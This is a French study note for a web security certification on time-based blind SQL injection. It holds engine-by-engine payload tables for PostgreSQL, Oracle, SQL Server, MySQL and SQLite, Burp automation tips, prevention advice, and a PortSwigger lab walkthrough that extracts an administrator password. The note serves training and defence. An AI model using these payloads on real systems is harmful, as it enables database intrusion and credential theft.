---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: en cours
---
# Blind SQLi - Triggering time delay

## En bref
- Injection SQL aveugle où l'on injecte un délai dont la durée dépend d'une condition : réponse lente si la condition est vraie, réponse rapide si elle est fausse.
- Utile quand ni le contenu de la page ni les erreurs ne changent : seul le temps de réponse porte l'information.
- La fonction de délai est propre à chaque moteur de base de données (voir le catalogue plus bas).
- Les requêtes SQL sont traitées de façon synchrone, donc un délai côté base retarde la réponse HTTP. Ce temps de réponse indique la valeur de vérité de la condition.
- Cette note est la référence détaillée pour le temps. La note [[Blind-SQL-injection]] n'en garde que la synthèse.

## Types et variantes
Quatre formes d'injection, selon ce que le moteur et le contexte permettent.

| Forme | Moteurs concernés | Principe |
|---|---|---|
| Requête empilée | SQL Server (obligatoire pour `WAITFOR`), PostgreSQL selon le pilote, MySQL rarement | Un `;` ouvre une seconde instruction qui contient le délai |
| Concaténation (`\|\|` ou `+`) | Oracle et PostgreSQL (`\|\|`), SQL Server (`+`) | Le délai est évalué dans une expression collée à la chaîne d'origine |
| Sous-requête avec `AND` | MySQL, MariaDB, PostgreSQL | Le délai est évalué dans une condition `AND` ; au moins une ligne doit être lue |
| Repli sans fonction de pause (calcul lourd) | Oracle, SQL Server, MySQL (`BENCHMARK`), SQLite | Une opération coûteuse ralentit la réponse ; imprécis |

Fonction de délai par moteur :

| Moteur | Fonction de délai | Requêtes empilées nécessaires ? | Forme habituelle |
|---|---|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),N)` | Non (et non acceptées) | Concaténation |
| SQL Server | `WAITFOR DELAY '0:0:N'` | Oui (pas une expression) | Requête empilée |
| PostgreSQL | `pg_sleep(N)` | Non, mais possibles selon le pilote | Concaténation ou requête empilée |
| MySQL et MariaDB | `SLEEP(N)` | Non (empilées rares) | Sous-requête avec `AND` ou `IF` |
| SQLite | Aucune fonction native | Selon l'interface | Calcul lourd |

## Comment détecter
1. **Temps de référence** : envoyer 5 à 10 requêtes sans payload et noter la moyenne et l'écart-type du temps de réponse.
2. **Délai court** : tester un délai de 3 à 5 secondes. Le délai long ne sert que pour l'extraction.
3. **Confirmation par inversion** : vrai, faux, vrai. La réponse doit être lente, rapide, lente, de façon reproductible.
4. **Sonder les moteurs un par un** (délai de 5 secondes, `xyz` = valeur d'origine du cookie `TrackingId`) :

| Payload | Moteur indiqué | Remarque |
|---|---|---|
| `xyz'\|\|pg_sleep(5)--` | PostgreSQL | Lab confirmé |
| `xyz'\|\|dbms_pipe.receive_message(('a'),5)--` | Oracle | Droit sur `DBMS_PIPE` nécessaire |
| `xyz'%3BWAITFOR DELAY '0:0:5'--` | SQL Server | Requête empilée acceptée |
| `xyz' AND SLEEP(5)-- -` | MySQL ou MariaDB | Au moins une ligne lue |

- Si aucun payload ne retarde la réponse, ne pas conclure à l'absence de faille : passer à l'interaction hors bande (voir [[Blind-SQL-injection]]).
- **Choisir la forme** : si `;` est accepté (requête empilée), la forme empilée est la plus simple. Sinon, utiliser la concaténation ou la sous-requête.

### Contraintes de contexte d'injection
- **Encodage** : dans un cookie, `;` s'envoie `%3B`, le `+` de SQL Server s'envoie `%2b`, et `#` (MySQL) s'envoie `%23`. Dans Burp Repeater, sélectionner le texte puis Ctrl+U l'encode en URL.
- **Cookie et concaténation** : préférer la forme équilibrée `xyz'||(...)||'` qui garde la requête d'origine intacte, sans commentaire final ni souci d'espace après `--`. Ne pas toucher au cookie `session`.
- **Contexte numérique** : retirer les apostrophes, par exemple `1 AND (SELECT ...)`.
- **Délai évalué par ligne** : une fonction de pause dans un `WHERE` ou dans un `SELECT ... FROM table` s'exécute une fois par ligne lue (50 lignes avec `pg_sleep(10)` donnent 500 secondes). Restreindre à une ligne (`WHERE username='administrator'`). Si aucune ligne n'est lue, il n'y a aucun délai (faux négatif).
- **Expiration côté serveur** : elle tombe vers 30 secondes (erreurs 504, coupure de la connexion). Rester bien en dessous.

## Comment exploiter (principe)
Le délai ne se déclenche que si la condition est vraie. La requête doit lire une seule ligne (l'utilisateur ciblé). Ordre de travail :
1. **Existence de l'utilisateur** : condition toujours vraie (`1=1`) sur la requête restreinte à `WHERE username='administrator'`. Un délai prouve que la ligne existe.
2. **Longueur du mot de passe** : tester `LENGTH(password)>1` puis `>2`, et ainsi de suite (`LEN` sur SQL Server). Tant que la réponse est lente, le mot de passe est plus long que le nombre testé. Le premier nombre sans délai donne la longueur.
3. **Caractère par caractère** : faire varier la position de `SUBSTRING` (`SUBSTR` sur Oracle) et le caractère comparé.
	- Égalité : un seul hit par position, mais jusqu'à 36 requêtes par position sur a-z et 0-9.
	- Dichotomie (`ASCII(...)>109`) : environ la moitié des requêtes, avec la casse exacte.
- Utiliser `ASCII` et `SUBSTRING` pour distinguer majuscules et minuscules (la comparaison de texte dépend de la collation).

Exemples du principe sur SQL Server (autres moteurs : catalogue ci-dessous) :
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:<N>'--
```
- Le délai se produit uniquement si la condition sur le caractère testé est vraie.
- On répète en faisant varier la position `SUBSTRING` et le caractère comparé pour reconstituer la valeur.

### Catalogue de payloads par moteur
Conventions : `<CONDITION>` = condition testée ; `xyz` = valeur d'origine du cookie `TrackingId` ; le dernier `'` est fourni par la requête d'origine dans les formes équilibrées ; délais de 10 secondes (réduire à 5 si le serveur coupe avant). Statut "Vérifié" = syntaxe certaine ou confirmée par le journal du lab ; "À vérifier" = cohérente mais non testée. D'après l'analyse, aucun de ces payloads n'a été rejoué pour cette note.

#### Oracle (pas de requête empilée)
| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Délai simple | `xyz'\|\|dbms_pipe.receive_message(('a'),10)--` | Chaîne, droit `EXECUTE` sur `DBMS_PIPE` | Vérifié |
| Délai simple équilibré | `xyz'\|\|dbms_pipe.receive_message(('a'),10)\|\|'` | Valeur de cookie, sans commentaire | Vérifié |
| Conditionnel | `xyz'\|\|(SELECT CASE WHEN (<CONDITION>) THEN dbms_pipe.receive_message(('a'),10) ELSE 0 END FROM dual)\|\|'` | `FROM dual` obligatoire | Vérifié |
| Extraction | `xyz'\|\|(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message(('a'),10) ELSE 0 END FROM users WHERE username='administrator')\|\|'` | La ligne doit exister | Vérifié |
| Dichotomie | même forme, avec `ASCII(SUBSTR(password,1,1))>109` à la place de la condition | `SUBSTR`, pas `SUBSTRING` | Vérifié |

Pièges Oracle :
- `;` n'est pas accepté.
- `receive_message` attend un message sur le tube `'a'` ; s'il y en a déjà un, la réponse est immédiate (utiliser un nom de tube aléatoire si le résultat est douteux).
- `DBMS_LOCK.SLEEP` et `DBMS_SESSION.SLEEP` sont des procédures, inutilisables dans une expression SQL.
- Sans `DBMS_PIPE`, repli par calcul lourd (produit de `all_objects`, voir [[Blind-SQL-injection]]), imprécis.
- `--` n'exige pas d'espace.

#### Microsoft SQL Server (requêtes empilées obligatoires pour `WAITFOR`)
| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Délai simple | `xyz'%3BWAITFOR DELAY '0:0:10'--` | Requête empilée, `;` en `%3B` dans un cookie | Vérifié |
| Conditionnel | `xyz'%3BIF (<CONDITION>) WAITFOR DELAY '0:0:10'--` | Requête empilée | Vérifié |
| Extraction (comptage) | `xyz'%3BIF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '0:0:10'--` | Requête empilée | Vérifié |
| Dichotomie | `xyz'%3BIF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109) WAITFOR DELAY '0:0:10'--` | Requête empilée | Vérifié |
| Longueur | `xyz'%3BIF (SELECT LEN(password) FROM users WHERE username='administrator')>5 WAITFOR DELAY '0:0:10'--` | `LEN`, pas `LENGTH` | Vérifié |
| Contexte numérique | `1%3BWAITFOR DELAY '0:0:10'--` | Pas d'apostrophe à fermer | Vérifié |

Pièges SQL Server :
- Format du délai `'h:mm:ss'` (`'0:0:10'` vaut 10 secondes).
- `WAITFOR` et `IF` ne sont pas des expressions : impossible en sous-requête ou derrière `+`.
- Sans requête empilée, seul le repli par calcul lourd (produit croisé de `sys.objects`) reste possible, imprécis, à vérifier.
- La concaténation est `+`, envoyé `%2b`.
- Un pilote qui n'accepte qu'une instruction par requête ne donne aucun délai (faux négatif).

#### PostgreSQL (requêtes empilées possibles selon le pilote)
| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Délai simple, concaténation | `xyz'\|\|pg_sleep(10)--` | Chaîne, sans requête empilée | Vérifié (lab de l'opérateur) |
| Délai simple, empilé | `xyz'%3BSELECT pg_sleep(10)--` | Requête empilée acceptée | Vérifié |
| Délai simple, sous-requête | `xyz' AND 1337=(SELECT 1337 FROM pg_sleep(10))-- -` | Au moins une ligne lue, évite le type `void` | À vérifier |
| Conditionnel, concaténation | `xyz'\|\|(SELECT CASE WHEN (<CONDITION>) THEN pg_sleep(10) ELSE pg_sleep(0) END)\|\|'` | Sans requête empilée | Vérifié (journal du lab) |
| Conditionnel, empilé | `xyz'%3BSELECT CASE WHEN (<CONDITION>) THEN pg_sleep(10) ELSE pg_sleep(0) END--` | Requête empilée acceptée | Vérifié |
| Extraction | `xyz'\|\|(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')\|\|'` | La ligne doit exister | Vérifié (journal du lab) |
| Dichotomie | même forme, avec `ASCII(SUBSTRING(password,1,1))>109` à la place de la condition | Casse exacte | Vérifié |
| Longueur | même forme, avec `LENGTH(password)>N` à la place de la condition | `LENGTH` | Vérifié |
| Conditionnel sans type `void` | `xyz' AND 1=(SELECT CASE WHEN (<CONDITION>) THEN (SELECT 1 FROM pg_sleep(10)) ELSE 1 END)-- -` | Si la comparaison de `void` échoue | À vérifier |
| Autre fonction | `pg_sleep_for('10 seconds')` | Si `pg_sleep` est filtré | À vérifier |

Pièges PostgreSQL :
- `pg_sleep(0)` dans le `ELSE` garde le même type que la branche vraie.
- Une sous-requête `... FROM users` sans filtre endort chaque ligne : garder `WHERE username='administrator'`.
- `--` n'exige pas d'espace.
- `;` s'envoie `%3B` dans un cookie.
- La forme `||` exige que la valeur d'origine soit une chaîne.

#### MySQL (requêtes empilées rares) et MariaDB
| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Délai simple | `xyz' AND SLEEP(10)-- -` | Au moins une ligne lue | Vérifié |
| Conditionnel | `xyz' AND IF(<CONDITION>,SLEEP(10),0)-- -` | Sur un identifiant qui existe | Vérifié |
| Extraction | `xyz' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a',SLEEP(10),0)-- -` | `BINARY` si la collation est insensible à la casse | Vérifié |
| Dichotomie | `xyz' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109,SLEEP(10),0)-- -` | Casse exacte | Vérifié |
| Sous-requête | `xyz' AND (SELECT SLEEP(10) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')-- -` | Délai seulement si la ligne existe | À vérifier |
| Contexte numérique | `1 AND IF(<CONDITION>,SLEEP(10),0)-- -` | Pas d'apostrophe | Vérifié |
| Empilé | `xyz'%3BSELECT SLEEP(10)-- -` | Requête empilée acceptée (rare) | À vérifier |
| Repli | `IF(<CONDITION>,BENCHMARK(5000000,SHA1('a')),0)` | `SLEEP` filtré | Imprécis, voir [[Blind-SQL-injection]] |

Pièges MySQL et MariaDB :
- `--` exige un espace ou un caractère de contrôle après (`-- -`, `--+` en URL, ou `#` encodé `%23`).
- `||` vaut `OR` par défaut sur MySQL, ce n'est pas une concaténation : la forme `||pg_sleep` ne s'applique pas.
- `SLEEP` est évalué par ligne : sur une table de plusieurs lignes, `AND SLEEP(10)` multiplie le délai ; si aucune ligne n'est lue, il n'y a aucun délai.
- MariaDB : `SLEEP` identique, vérifier `BENCHMARK`.
- `SLEEP` renvoie 0 en fin normale : on ne regarde que le temps.

#### SQLite (aucune fonction de pause native)
| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Délai par calcul lourd | `xyz' AND (SELECT CASE WHEN (<CONDITION>) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000)))) ELSE 1 END)-- -` | Laboratoire isolé uniquement | À vérifier |

Pièges SQLite :
- Imprécis et lourd en mémoire et en processeur.
- `randomblob(500000000)` seul ne fait qu'allouer de la mémoire et peut donner une erreur de taille.
- Préférer les erreurs conditionnelles ou le signal booléen.
- Commentaire `--`, concaténation `||`, requêtes empilées selon l'interface.

### Automatisation avec Burp
- **Repeater** : le temps de réponse s'affiche en bas à droite.
- **Intruder, cluster bomb** : une position pour l'index et une pour le caractère (position multipliée par caractère). Intruder ne fait pas de dichotomie : pour la dichotomie, utiliser Turbo Intruder ou un script.
- **Resource pool** : le limiter à une seule requête simultanée. Si Intruder en envoie plusieurs en parallèle, les pauses se mélangent et les temps ne veulent plus rien dire.
- **Colonnes de temps** : dans Intruder, menu Columns, activer "Response received" et "Response completed", puis trier sur la durée.
- **Seuil de décision** : trier par durée décroissante et comparer à la moyenne de base. Avec un délai de 5 secondes, un seuil de 4 secondes évite le piège d'un seuil "5 secondes ou plus" trop juste. En cas de faux positifs, passer à 10 secondes.
- Grep - Match ne sert pas ici : le signal est le temps, pas le contenu.

## Pièges et points d'attention BSCP
- **Espace** : `+` ou `%20` selon le contexte (URL ou cookie). `%3B` pour `;`, `%2b` pour `+` (SQL Server), `%23` pour `#` (MySQL).
- **Cookie `session`** : le laisser intact, seul `TrackingId` est modifié.
- **Validation** : confirmer par inversion (vrai, faux, vrai) et mesurer le temps de base avant de conclure.
- **Resource pool** : une seule requête simultanée dans Intruder (voir la section Automatisation).
- **Seuil** : un seuil trop juste (5 secondes pour un délai de 5 secondes) donne des faux négatifs. Comparer à la moyenne de base.
- **Délai évalué par ligne** : restreindre à une ligne, sinon le délai se multiplie. Aucune ligne lue donne un faux négatif.
- **Expiration serveur** vers 30 secondes : rester bien en dessous.
- **Fiabilité** : un cache, un pare-feu applicatif qui retarde les requêtes suspectes ou la charge du lab peuvent fausser la mesure.
- **Moteur** : la fonction de délai dépend du moteur, ne pas rejouer un payload PostgreSQL sur un autre moteur.

## Prévention
Voir [[SQL-injection]] (requêtes paramétrées, moindre privilège) et [[Blind-SQL-injection]] (réponses uniformes, filtrage sortant). Propre au temps :
- Temps de réponse uniforme, que la requête réussisse ou échoue.
- Délai maximal de requête côté base (`statement_timeout` sur PostgreSQL, `max_execution_time` sur MySQL).
- Retrait des droits sur `dbms_pipe` pour le compte applicatif Oracle.
- Surveillance des requêtes lentes répétitives.

## Labs PortSwigger
Case cochée sur la base de [[Blind-SQL-injection]], qui indique les deux labs de délai comme terminés le 2026-11-02 (niveau Practitioner pour toute la catégorie, d'après cette note).
- [ ] Apprentice
- [x] Practitioner ✅ 2026-11-02
- [ ] Expert

## Journal des labs
### Lab: Blind SQL injection with time delays
- **Énoncé** : injection aveugle dans le cookie de suivi. Le résultat n'est pas renvoyé et l'application ne réagit pas différemment, mais la requête est exécutée de façon synchrone. Objectif : provoquer un délai de 10 secondes.
- **Moteur et variante** : à confirmer (PostgreSQL probable d'après [[Blind-SQL-injection]]) ; délai simple, sans extraction.
- **Signal observé** : temps de réponse.
- **Méthode** : à compléter, solution non consignée.
- **Payloads clés** (exacts) : à compléter.
- **Pièges rencontrés** : à compléter.
- **Statut et date** : terminé le 2026-11-02 d'après [[Blind-SQL-injection]] ; détails à compléter.

### Lab: Blind SQL injection with time delays and information retrieval
- **Énoncé** : injection aveugle dans le cookie de suivi `TrackingId`, utilisé par une requête SQL. Rien n'est renvoyé et la réponse ne change ni sur les lignes ni sur les erreurs, mais la requête est synchrone, donc on peut déclencher des délais conditionnels. Une table `users` contient les colonnes `username` et `password`. Objectif : trouver le mot de passe de `administrator` et se connecter avec ce compte.
- **Moteur et variante** : PostgreSQL (confirmé par `pg_sleep`) ; délai conditionnel avec extraction.
- **Signal observé** : temps de réponse (rien ne s'affiche, ni résultat ni erreur).
- **Résultat** : mot de passe de 20 caractères, lab validé (2026-11-02 d'après [[Blind-SQL-injection]]).

#### Solution
**Capturer la requête**

Je charge la page d'accueil du lab avec Burp en proxy, puis j'envoie la requête au Repeater. C'est le cookie `TrackingId` que je modifie. Rien ne s'affiche jamais, donc je ne peux me fier qu'au temps de réponse.

**Confirmer l'injection**

J'ajoute `'||pg_sleep(5)--` à la fin de la valeur du cookie. La réponse met cinq secondes à revenir. L'injection marche, et `pg_sleep` me dit que c'est du PostgreSQL.

**Rendre le délai conditionnel**

Il faut que la pause dépende d'une condition, sinon elle ne m'apprend rien.

- **Condition vraie** : `'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)||'` fait attendre cinq secondes.
- **Condition fausse** : avec `1=2` à la place, la réponse est immédiate.

J'ai maintenant un détecteur vrai ou faux, et tout le reste repose dessus.

**Vérifier que le compte existe**

`'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'`

Cinq secondes de pause, donc `administrator` est bien dans la table `users`. (Condition notée `1=1` ici : `username='administrator'` était redondant avec le `WHERE`.)

**Trouver la longueur du mot de passe**

Avant de chercher les caractères, je cherche la longueur, ça évite de tirer dans le vide. Je teste `LENGTH(password)>1` puis `>2`, et ainsi de suite, dans la requête complète suivante :

`'||(SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'`

Tant que la réponse est lente, le mot de passe est plus long que le nombre testé. Le premier nombre sans délai donne la longueur : vingt caractères.

**Extraire le mot de passe**

La requête de base teste une seule position :

`'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'`

À la main, ça ferait vingt positions fois trente-six caractères possibles. Je passe donc par l'Intruder.

- Type d'attaque : **Cluster bomb**.
- Marqueurs : un sur la position et un sur le caractère, ce qui donne `SUBSTRING(password,§1§,1)='§a§'`.
- Premier jeu de charges : les nombres de 1 à 20.
- Second jeu de charges : les lettres minuscules et les chiffres, car le mot de passe du lab n'a pas d'autre alphabet.
- Resource pool : une seule requête à la fois. Si l'Intruder en envoie plusieurs en parallèle, les pauses se mélangent et les temps ne veulent plus rien dire.

J'affiche la colonne **Response received** et je trie dessus. Les lignes à quatre secondes ou plus sont les bonnes (délai de cinq secondes, seuil un peu en dessous). Si la latence du lab crée des faux positifs, je passe à `pg_sleep(10)` et je relance.
Je relève un caractère par position, je les remets dans l'ordre et j'obtiens le mot de passe de l'administrator.

**Se connecter**

Sur /login, je saisis `administrator` et ce mot de passe. Le lab est validé.

- **Pièges rencontrés** : pauses mélangées si l'Intruder envoie plusieurs requêtes en parallèle (Resource pool limité à une requête) ; faux positifs possibles à cause de la latence du lab (passer à `pg_sleep(10)`).

## Liens
- [[SQL-injection-Union-Attacks]]
- [[Blind-SQL-injection]]
- [[Error-based SQL Injection]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
